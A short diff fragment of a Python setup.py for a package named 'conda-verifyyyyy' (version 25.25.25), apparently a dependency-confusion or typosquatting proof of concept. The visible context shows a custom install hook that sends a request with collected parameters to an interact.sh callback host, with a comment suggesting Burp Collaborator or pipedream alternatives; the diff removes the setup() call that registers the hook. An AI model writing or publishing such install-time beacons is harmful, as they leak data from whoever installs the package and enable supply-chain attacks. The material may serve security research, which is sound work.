@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("https://cbsbeka2vtc00001d14ggfhizjayyyyyb.interact.sh",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='conda-verifyyyyy', #package name
-      version='25.25.25',
-      description='test',
-      author='Saumya_Agrawal',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                                 
